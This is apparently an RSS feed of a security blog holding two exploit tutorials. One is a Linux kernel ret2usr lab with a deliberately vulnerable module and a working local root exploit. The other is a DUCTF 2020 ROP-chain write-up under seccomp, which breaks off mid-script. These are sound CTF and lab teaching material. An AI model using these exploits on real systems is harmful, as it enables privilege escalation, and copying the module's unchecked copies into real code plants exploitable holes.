<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Anubis</title><link>https://anvbis.github.io/posts/</link><description>Recent content in Posts on Anubis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Copyright 2020 Anvbis</copyright><lastBuildDate>Fri, 10 Dec 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux Kernel :: Ret2usr</title><link>https://anvbis.github.io/posts/linux-kernel-ret2usr/</link><pubDate>Fri, 10 Dec 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-ret2usr/</guid><description>Environment Setup ~/ $ git clone https://github.com/pwncollege/pwnkernel.git Cloning into 'pwnkernel'... remote: Enumerating objects: 115, done. remote: Counting objects: 100% (115/115), done. remote: Compressing objects: 100% (73/73), done. remote: Total 115 (delta 59), reused 92 (delta 37), pack-reused 0 Receiving objects: 100% (115/115), 18.84 KiB | 9.42 MiB/s, done. Resolving deltas: 100% (59/59), done. ~/ $ cd pwnkernel/ ~/pwnkernel $ ./build.sh ... #!/bin/bash # build root fs pushd fs find .</description><content type="html"><![CDATA[<h2 id="environment-setup">Environment Setup</h2>
<pre><code>~/ $ git clone https://github.com/pwncollege/pwnkernel.git
Cloning into 'pwnkernel'...
remote: Enumerating objects: 115, done.
remote: Counting objects: 100% (115/115), done.
remote: Compressing objects: 100% (73/73), done.
remote: Total 115 (delta 59), reused 92 (delta 37), pack-reused 0
Receiving objects: 100% (115/115), 18.84 KiB | 9.42 MiB/s, done.
Resolving deltas: 100% (59/59), done.

~/ $ cd pwnkernel/
~/pwnkernel $ ./build.sh
...

</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
<span style="color:#75715e"># build root fs</span>
pushd fs
find . -print0 | cpio --null -ov --format<span style="color:#f92672">=</span>newc | gzip -9 &gt; ../initramfs.cpio.gz
popd

<span style="color:#75715e"># launch</span>
/usr/bin/qemu-system-x86_64 <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>    -kernel linux-5.4/arch/x86/boot/bzImage <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>    -initrd $PWD/initramfs.cpio.gz <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>    -fsdev local,security_model<span style="color:#f92672">=</span>passthrough,id<span style="color:#f92672">=</span>fsdev0,path<span style="color:#f92672">=</span>$HOME <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>    -device virtio-9p-pci,id<span style="color:#f92672">=</span>fs0,fsdev<span style="color:#f92672">=</span>fsdev0,mount_tag<span style="color:#f92672">=</span>hostshare <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>    -nographic <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>    -monitor none <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>    -s <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>    -append <span style="color:#e6db74">&#34;console=ttyS0 nokaslr quiet&#34;</span>
</code></pre></div><pre><code>~/pwnkernel $ ./launch.sh
</code></pre><h2 id="debugging-the-kernel">Debugging the Kernel</h2>
<pre><code>~/pwnkernel $ gdb ./linux-5.4/vmlinux 
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
...

pwndbg&gt; target remote :1234
Remote debugging using :1234
default_idle () at arch/x86/kernel/process.c:581
...
</code></pre><h2 id="practice-kernel-module">Practice Kernel Module</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kernel.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/fs.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/proc_fs.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/uaccess.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
MODULE_LICENSE(<span style="color:#e6db74">&#34;GPL&#34;</span>);

<span style="color:#66d9ef">struct</span> proc_dir_entry <span style="color:#f92672">*</span>proc_entry;

<span style="color:#66d9ef">static</span> ssize_t <span style="color:#a6e22e">challenge_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>fp, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, size_t len, loff_t <span style="color:#f92672">*</span>off)
{
    <span style="color:#66d9ef">char</span> data[<span style="color:#ae81ff">32</span>];
    <span style="color:#66d9ef">return</span> raw_copy_to_user(buf, data, len);
}

<span style="color:#66d9ef">static</span> ssize_t <span style="color:#a6e22e">challenge_write</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>fp, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, size_t len, loff_t <span style="color:#f92672">*</span>off)
{
    <span style="color:#66d9ef">char</span> data[<span style="color:#ae81ff">32</span>];
    <span style="color:#66d9ef">return</span> raw_copy_from_user(data, buf, len);
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">challenge_open</span>(<span style="color:#66d9ef">struct</span> inode <span style="color:#f92672">*</span>inode, <span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>fp)
{
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">challenge_release</span>(<span style="color:#66d9ef">struct</span> inode <span style="color:#f92672">*</span>inode, <span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>fp)
{
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> file_operations fops <span style="color:#f92672">=</span> {
    .read    <span style="color:#f92672">=</span> challenge_read,
    .write   <span style="color:#f92672">=</span> challenge_write,
    .open    <span style="color:#f92672">=</span> challenge_open,
    .release <span style="color:#f92672">=</span> challenge_release
};

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">init_module</span>(<span style="color:#66d9ef">void</span>)
{
    proc_entry <span style="color:#f92672">=</span> proc_create(<span style="color:#e6db74">&#34;challenge&#34;</span>, <span style="color:#ae81ff">0666</span>, NULL, <span style="color:#f92672">&amp;</span>fops);
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">cleanup_module</span>(<span style="color:#66d9ef">void</span>)
{
    <span style="color:#66d9ef">if</span> (proc_entry) {
        proc_remove(proc_entry);
    }
}
</code></pre></div><pre><code>~/ $ cp challenge.c ~/pwnkernel/src/challenge.c 
</code></pre><pre><code># add more modules here!
obj-m = challenge.o
KERNEL_VERSION=5.4

all: 
    echo $(OBJECTS)
    make -C ../linux-$(KERNEL_VERSION) M=$(PWD) modules

clean:
    make -C ../linux-$(KERNEL_VERSION) M=$(PWD) clean
</code></pre><pre><code>~/pwnkernel $ ./build.sh
...

~/pwnkernel $ ./launch.sh
...

/ # id
uid=0(root) gid=0
/ # insmod ./challenge.ko
</code></pre><h2 id="escalating-privileges">Escalating Privileges</h2>
<pre><code>creds = prepare_kernel_cred(0);
commit_creds(creds);
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rdi</span>
<span style="color:#a6e22e">movabs</span> <span style="color:#66d9ef">rbx</span>, <span style="color:#66d9ef">prepare_kernel_cred</span>
<span style="color:#a6e22e">call</span> <span style="color:#66d9ef">rbx</span>
<span style="color:#a6e22e">movabs</span> <span style="color:#66d9ef">rbx</span>, <span style="color:#66d9ef">commit_creds</span>
<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
<span style="color:#a6e22e">call</span> <span style="color:#66d9ef">rbx</span>
</code></pre></div><h2 id="returning-to-user-space">Returning to User-Space</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">swapgs</span>
<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r15</span>, <span style="color:#66d9ef">saved_ss</span>
<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">r15</span>
<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r15</span>, <span style="color:#66d9ef">saved_rsp</span>
<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">r15</span>
<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r15</span>, <span style="color:#66d9ef">saved_rflags</span>
<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">r15</span>
<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r15</span>, <span style="color:#66d9ef">saved_cs</span>
<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">r15</span>
<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r15</span>, <span style="color:#66d9ef">target_rip</span>
<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">r15</span>
<span style="color:#a6e22e">iretq</span>
</code></pre></div><h2 id="exploit-development">Exploit Development</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;assert.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> save_ss, save_sp, save_rf, save_cs;

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">shell</span>()
{
    system(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">save_user_space</span>()
{
    <span style="color:#75715e">/* save user-space */</span>
    __asm__(
        <span style="color:#e6db74">&#34;.intel_syntax noprefix;&#34;</span>
        <span style="color:#e6db74">&#34;mov save_ss, ss;&#34;</span>
        <span style="color:#e6db74">&#34;mov save_sp, rsp;&#34;</span>
        <span style="color:#e6db74">&#34;pushf;&#34;</span>
        <span style="color:#e6db74">&#34;pop save_rf;&#34;</span>
        <span style="color:#e6db74">&#34;mov save_cs, cs;&#34;</span>
        <span style="color:#e6db74">&#34;.att_syntax;&#34;</span>
    ); 
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">load_user_space</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> target)
{
    <span style="color:#75715e">/* return to user-space */</span>
    __asm__(
        <span style="color:#e6db74">&#34;.intel_syntax noprefix;&#34;</span>
        <span style="color:#e6db74">&#34;swapgs;&#34;</span>
        <span style="color:#e6db74">&#34;mov r15, save_ss;&#34;</span>
        <span style="color:#e6db74">&#34;push r15;&#34;</span>
        <span style="color:#e6db74">&#34;mov r15, save_sp;&#34;</span>
        <span style="color:#e6db74">&#34;push r15;&#34;</span>
        <span style="color:#e6db74">&#34;mov r15, save_rf;&#34;</span>
        <span style="color:#e6db74">&#34;push r15;&#34;</span>
        <span style="color:#e6db74">&#34;mov r15, save_cs;&#34;</span>
        <span style="color:#e6db74">&#34;push r15;&#34;</span>
        <span style="color:#e6db74">&#34;mov r15, %[rip];&#34;</span>
        <span style="color:#e6db74">&#34;push r15;&#34;</span>
        <span style="color:#e6db74">&#34;iretq;&#34;</span>
        <span style="color:#e6db74">&#34;.att_syntax;&#34;</span>
        <span style="color:#f92672">:</span> [rip] <span style="color:#e6db74">&#34;=&amp;r&#34;</span> (target)
    );
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">escalate_privileges</span>()
{
    <span style="color:#75715e">/* escalate privileges */</span>
    __asm__(
        <span style="color:#e6db74">&#34;.intel_syntax noprefix;&#34;</span>
        <span style="color:#e6db74">&#34;xor rdi, rdi;&#34;</span>
        <span style="color:#e6db74">&#34;movabs rbx, 0xffffffff810881c0;&#34;</span>  <span style="color:#75715e">// prepare_kernel_cred
</span><span style="color:#75715e"></span>        <span style="color:#e6db74">&#34;call rbx;&#34;</span>
        <span style="color:#e6db74">&#34;movabs rbx, 0xffffffff81087e80;&#34;</span>  <span style="color:#75715e">// commit_creds
</span><span style="color:#75715e"></span>        <span style="color:#e6db74">&#34;mov rdi, rax;&#34;</span>
        <span style="color:#e6db74">&#34;call rbx;&#34;</span>
        <span style="color:#e6db74">&#34;.att_syntax;&#34;</span>
    );

    <span style="color:#75715e">/* return to user-space */</span>
    load_user_space((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)shell);
}

<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">leak_canary</span>(<span style="color:#66d9ef">int</span> fd)
{
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> leak[<span style="color:#ae81ff">5</span>];
    read(fd, leak, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">5</span>);
    <span style="color:#66d9ef">return</span> leak[<span style="color:#ae81ff">4</span>];
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">overflow_buffer</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> canary)
{
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> payload[<span style="color:#ae81ff">6</span>];

    payload[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> canary;
    payload[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)escalate_privileges;

    write(fd, payload, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">6</span>);
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
{
    save_user_space();

    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/proc/challenge&#34;</span>, O_RDWR);
    assert(fd <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>);

    <span style="color:#75715e">/* leak stack canary */</span>
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> canary <span style="color:#f92672">=</span> leak_canary(fd);
    printf(<span style="color:#e6db74">&#34;[*] canary @ 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, canary);

    overflow_buffer(fd, canary); 

    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><pre><code>~/linux-kernel-exp/ret2usr $ id
uid=1000(ctf) gid=1000 groups=1000
~/linux-kernel-exp/ret2usr $ ./exploit
[*] canary @ 0xb30ee19bbcd24b00
/home/ctf/linux-kernel-exp/ret2usr # id
uid=0(root) gid=0
</code></pre>]]></content></item><item><title>DUCTF 2020 :: Return to What's Revenge</title><link>https://anvbis.github.io/posts/ductf-2020-return-to-whats-revenge/</link><pubDate>Tue, 17 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/ductf-2020-return-to-whats-revenge/</guid><description>Reverse Engineering Running file tells us that the target binary is a 64-bit dynamically linked linux executable.
$ file ./return-to-whats-revenge ./return-to-whats-revenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=85709e2a953fc6f7da43f29d1dee0c5cc682a059, with debug_info, not stripped We can run pwntools' checksec tool to get a better overview of the protections the target binary has in place. Note that the only protection in place is DEP, so we&amp;rsquo;ll likely have to build a ROP chain to bypass it.</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
<p>Running <code>file</code> tells us that the target binary is a 64-bit dynamically linked linux executable.</p>
<pre><code>$ file ./return-to-whats-revenge 
./return-to-whats-revenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=85709e2a953fc6f7da43f29d1dee0c5cc682a059, with debug_info, not stripped
</code></pre><p>We can run pwntools' <code>checksec</code> tool to get a better overview of the protections the target binary has in place. Note that the only protection in place is DEP, so we&rsquo;ll likely have to build a ROP chain to bypass it.</p>
<pre><code>$ checksec ./return-to-whats-revenge 
[*] './return-to-whats-revenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000) 
</code></pre><p>Running the binary shows us that it simply prompts the user for input prior to exiting. It&rsquo;s likely we&rsquo;ll find a vulnerability of some sort where it takes user input.</p>
<pre><code>$ ./return-to-whats-revenge 
Today, we'll have a lesson in returns.
Where would you like to return to?
asdf
</code></pre><p>Disassembling the executable shows us that it contains two important functions. The <code>main</code> function calls a function called <code>vuln</code>. The <code>vuln</code> function makes a <code>gets</code> call with a stack variable, so we&rsquo;ve found a stack buffer overflow.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(<span style="color:#66d9ef">void</span>)
{
    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s;
    
    puts(<span style="color:#e6db74">&#34;Where would you like to return to?&#34;</span>);
    gets(<span style="color:#f92672">&amp;</span>s);
    <span style="color:#66d9ef">return</span>;
}

undefined8 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
{
    puts(<span style="color:#e6db74">&#34;Today, we</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">ll have a lesson in returns.&#34;</span>);
    vuln();
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Running <code>strace</code> on the binary shows us that (at some point prior to taking user input) instantiates several <code>seccomp</code> rules, so not only will we have to build a ROP chain, we&rsquo;ll have to work within the <code>seccomp</code> jail.</p>
<pre><code>$ strace ./return-to-whats-revenge

...

prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len=25, filter=0x7fff935ea670}) = 0

...
</code></pre><p>We can use a wonderful tool called <code>seccomp-tools</code> to dump the <code>seccomp</code> rules that the binary operates under. Note that the binary allows the <code>open</code>, <code>read</code>, and <code>write</code> syscalls - so we should be able to build a ROP chain that opens, reads, and writes the flag to <code>stdout</code>.</p>
<pre><code>$ seccomp-tools dump ./return-to-whats-revenge 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
</code></pre><p>Let&rsquo;s use <code>readelf</code> to get the address of the binary&rsquo;s <code>.data</code> section, we&rsquo;ll want to use it to store our <code>flag.txt</code> string that we use in the <code>open</code> syscall of our ROP chain.</p>
<pre><code>$ readelf --sections ./return-to-whats-revenge

..

   [22] .data             PROGBITS         0000000000404000  00003000
       0000000000000010  0000000000000000  WA 

...
</code></pre><p>Earlier we noticed that the binary uses <code>puts</code>, we can use this to perform a simple <code>puts(puts)</code> style leak to obtain the an address in <code>libc</code>. Let&rsquo;s find the offset of <code>puts</code> from the base of <code>libc</code>. We&rsquo;ll want to use this later to find the base address of <code>libc</code>.</p>
<pre><code>pwndbg&gt; info proc map
process 1461
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
...
      0x7ffff7def000     0x7ffff7e14000    0x25000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
...
pwndbg&gt; p puts
$2 = {int (const char *)} 0x7ffff7e655f0 &lt;__GI__IO_puts&gt;
pwndbg&gt; p/x 0x7ffff7e655f0-0x7ffff7def000
$3 = 0x765f0
</code></pre><p>Lastly, we just need to find a bunch of different ROP gadgets in order to perform our exploit. These are mostly just <code>pop reg; ret</code> instructions that we can use to move values into the registers we need to perform syscalls, and a <code>syscall</code> instruction that&rsquo;ll allow us to execute our <code>open</code>, <code>read</code>, and <code>write</code> syscalls.</p>
<pre><code>$ ropper --file ./return-to-whats-revenge --search 'pop rdi'         
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ./return-to-whats-revenge
0x00000000004019db: pop rdi; ret;
</code></pre><pre><code>$ ropper --file ./return-to-whats-revenge --search 'pop rsi'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rsi

[INFO] File: ./return-to-whats-revenge
0x00000000004019d9: pop rsi; pop r15; ret;
</code></pre><pre><code>$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'pop rdx'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdx

[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
...
0x00000000000cb1cd: pop rdx; ret;
</code></pre><pre><code>$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'pop rax'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rax

[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
...
0x000000000003ee88: pop rax; ret;
...
</code></pre><pre><code>$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'syscall'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: syscall

[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
...
0x00000000000580da: syscall; ret;
</code></pre><h2 id="information-gathering">Information Gathering</h2>
<p>The only bit of information we now need to gather is the offset of the return address from our input buffer.</p>
<p>Here&rsquo;s a quick script that&rsquo;ll attach the process to GDB before sending a large cyclic pattern of bytes to it, allowing us to find the offset of the return address from our input buffer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>


r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./return-to-whats-revenge&#39;</span>)
gdb<span style="color:#f92672">.</span>attach(r)

r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>writeline(cyclic(<span style="color:#ae81ff">300</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>))

r<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>After continuing in GDB and letting the program crash, we can see what was stored in the return address.</p>
<pre><code> ► 0x4011d9 &lt;vuln+39&gt;    ret    &lt;0x6161616161616168&gt;
</code></pre><p>We can use pwntools' <code>cyclic_find</code> function to calculate the offset of the return address from the start of our input buffer (using the value stored in the return address we found above).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">In [<span style="color:#ae81ff">2</span>]: cyclic_find(<span style="color:#ae81ff">0x6161616161616168</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
Out[<span style="color:#ae81ff">2</span>]: <span style="color:#ae81ff">56</span>
</code></pre></div><h2 id="exploit-development">Exploit Development</h2>
<p>Now that we have everything we need, we can start to write our exploit. There&rsquo;s a lot of things we&rsquo;ll need to achieve (leaks, etc), so here&rsquo;s a brief summary of what we want to do:</p>
<ul>
<li>Overwrite the return address to gain control of process execution.</li>
<li>Perform a <code>puts(puts)</code> leak to obtain an address in <code>libc</code>.</li>
<li>Calculate the base address of <code>libc</code>.</li>
<li>Return back to <code>main</code> so we can perform the second stage of our exploit.</li>
<li>Build a ROP chain that opens, reads, and writes the contents of <code>flag.txt</code>.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">import</span> time
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

context<span style="color:#f92672">.</span>clear(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>)


pad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">56</span> 


<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">return-to-whats-revenge
</span><span style="color:#e6db74">0x00000000004019db: pop rdi; ret;
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4019db</span>

<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">return-to-whats-revenge
</span><span style="color:#e6db74">0x00000000004019d9: pop rsi; pop r15; ret;
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4019d9</span>

<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">libc-3.1.so
</span><span style="color:#e6db74">0x00000000000cb1cd: pop rdx; ret;
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0cb1cd</span>

<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">libc-3.1.so
</span><span style="color:#e6db74">0x000000000003ee88: pop rax; ret;
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x03ee88</span>

<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">libc-3.1.so
</span><span style="color:#e6db74">0x00000000000580da: syscall; ret;
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0580da</span>


r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./return-to-whats-revenge&#39;</span>)


elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./return-to-whats-revenge&#39;</span>)


rop <span style="color:#f92672">=</span> ROP(elf)

rop<span style="color:#f92672">.</span>raw(pop_rdi)
rop<span style="color:#f92672">.</span>raw(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]) <span style="color:#75715e"># pop rdi ; got.puts</span>
